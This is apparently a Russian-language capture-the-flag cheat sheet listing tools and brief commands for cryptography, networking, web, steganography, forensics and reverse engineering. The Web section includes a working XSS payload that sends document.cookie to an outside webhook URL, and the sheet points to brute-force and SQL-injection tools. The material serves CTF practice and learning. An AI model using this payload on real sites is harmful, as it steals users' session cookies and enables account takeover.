###### РЕКОМЕНДУЮ СТАВИТЬ [КАЛИ ЛИНУКС](https://www.kali.org/) И ЗАРАНЕЕ СТАВИТЬ ВСЁ ИЗ ВАШЕЙ КАТЕГОРИИ

# Cryptography
- [quip quip](https://quipqiup.com/)
  - решалка криптограм которая стремиться к минимальной энропии(старается организовать слова)
- [cryptii](https://cryptii.com/)
  - многоуровневые шифрования/дешифрования
- [b64/32/url/hash/file en/de/coder](https://emn178.github.io/online-tools/base32_decode.html)
  - полезная штука
- [dcode (france)](https://www.dcode.fr/rot-13-cipher)
  - расшифровка всего
  - вбиваете в поиск шифр и оно откроет решалку данного шифра
  - умеет решать даже судоку)
- [crack station](https://crackstation.net/)
  - расшифровывает некоторые хеши
  - богатая база хешей(радужная таблица) 15 gb
- [hashes.com](https://hashes.com/en/decrypt/hash)
  - расшифровывает некоторые хеши
- [Hash identifier](https://www.kali.org/tools/hash-identifier/)
  - Проверка какой это хеш
  - [Online 1](https://www.tunnelsup.com/hash-analyzer/)
  - [Online 2](https://hashes.com/en/tools/hash_identifier)

# Network
- [wireshark](https://www.wireshark.org/#download)
  - в основном для загрузки pcap файлов содержащих кучу сетевых пакетов
  - внимательно читайте задание и ищите то что говорят
- [fiddler](https://www.telerik.com/download/fiddler-everywhere) 
  - подмена ответов запросов
- [burp suite](https://portswigger.net/burp/communitydownload)
  - подмена запросов и их отправка
  - и много других неизученых мною фич

# Web
#### XSS:
- Использовать webhook.site для возвратного получения данных(callback)
- <img src=x onerror=this.src='https://webhook.site/fad40d81-20a3-4ce9-9399-0c9a9a6e6a24/'+document.cookie;>
- В примере выше я отправляю на вебхук куки в качестве открытия страницы с названием куки

#### Extensions:
- шпоры по sql и тд
  - Firefox: https://addons.mozilla.org/en/firefox/addon/hacktools/ 
  - Chrome: https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi
  - ![img.png](img.png)

#### VPN:
- [windscribe](https://windscribe.com)
  - делаете аккаунт, затем в настройках аккаунта вводиться промокод "ПИЗДЕЦ" дает 30 гб
- [cloudflare warp](https://1.1.1.1/)
  - впн от cloudflare 
# Stenography
- Восстановление удаленных файлов
- Контейнеры 
  - Veracrypt, Truecrypt
- exiftool {имя_исполнительного_файла}
  - ищет метаданные
- Binwalk 
  - поиск исполняемых и других файлов в картинке
- grep -i "flag{"
  - поиск флага в прямую
- [dir binary search](python_tools/dir_binary_search.py)
  - в прямую ищет байты в директории рекурсивно
- [tineye](https://tineye.com/)
  - поиск по картинке
- [imagemagick](https://imagemagick.org/index.php)
  - манипуляция картинками
- [stegsolve.jar](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)
  - часто решает задачу сразу
- [steghide](https://steghide.sourceforge.net/download.php)
  - чтобы скачать нужен ВПН
  - steghide --extract -sf {имя_файла}
  - попытка найти что-либо в файле
- [pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html)
  - проверка на целостность картинки
- [zsteg](https://github.com/zed-0xff/zsteg)
  - поиск чего либо в PNG, BMP
- [smart deblur](http://smartdeblur.net/)
  - убирает размывание с фотографии
- [stegseek](https://github.com/RickdeJager/stegseek#releases)
  - перебирает все пароли 
  - [kali](https://www.kali.org/tools/stegcracker/)
- https://futureboy.us/stegano/decinput.html
- http://stylesuxx.github.io/steganography/
- https://www.mobilefish.com/services/steganography/steganography.php
- https://manytools.org/hacker-tools/steganography-encode-text-into-image/
- https://steganosaur.us/dissertation/tools/image
- https://georgeom.net/StegOnline

# Forensics
- Дампы памяти (.mem файлы) 
  - HxD Hex Editor 
    - редактор сырых данных
  - Volatility 
    - инструмент поиска и анализа инфы (ТОП)
  - Foremost 
    - поиск файлов из дампа


# Assembler
- file {имя_исполнительного_файла}
  - даёт информацию о расширении, подписи и формате
  - иногда организаторы могут дать бинарник, который окажется другим файлом, например картинкой
- strings -a {имя_исполнительного_файла}
  - ищет все строки в исп. фале
- base64
  - в интернете куча декодеров для этого шифра
  - часто используется
- [Ida Decompiler](https://out7.hex-rays.com/files/idafree77_windows.exe)
  - визуализация кода в виде графа
- [Assembler Reference](http://ref.x86asm.net/coder32.html#modrm_byte_16)
  - это сайт с инструкциями в ассемблере и их значениями в шестнадцатеричной системе счисления.
- [GDB Documentation](https://www.sourceware.org/gdb/documentation/)
  - мануал по gdb
- [Radare2](https://github.com/radareorg/radare2)
  - красивый gdb
- [BenEater](https://www.youtube.com/c/BenEater?app=desktop)
  - ютубер, объясняет ассемблер

# Vulnerability search
- [snyk-cli](https://docs.snyk.io/snyk-cli)
  - имбище(must have)
  - Ищет уязвимости в определенной папке.
  - Для тех заданий, где предоставлены исходники.
  - Даже если цель задания в другом, сканируйте код всё равно, может быть обходной путь.
- [sqlmap](https://sqlmap.org/)
  - Взлом sql и поиск уязвимостей в sql базе
- [thc-hydra](https://www.kali.org/tools/hydra/)
  - Bruteforce универсальный - thc-hydra
  - [Github](https://github.com/vanhauser-thc/thc-hydra)
- [Math.random() JS](https://www.youtube.com/watch?v=-h_rj2-HP2E)
  - взлом псевдо рандома в js
- [wappalayzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/)
  - получения технологий которые использует сайт
  <details>
    <summary>Картинка</summary>
    <img src="img_1.png">
  </details>
- [Insecure Deserialization Attack](https://www.youtube.com/watch?v=jwzeJU_62IQ)
  - атака на десиариазацию(восстановление обьектов из файла)
- [HTTP pollution](https://www.youtube.com/watch?v=QVZBl8yxVX0)
  - подмена параметров
- [XSS guide](https://www.youtube.com/watch?v=EoaDgUgS6QA)
  - полный разбор XXS(инъекция скрипта вместо текста)
- [Cross-Site Request Forgery](https://www.youtube.com/watch?v=eWEgUcHPle0)
  - получение куки через подмен получателя куки

# General
- [ctf-checklist](https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/)
- ![img_2.png](img_2.png)
  ###### [CTFCheatsheet.xmind](CTFCheatsheet.xmind)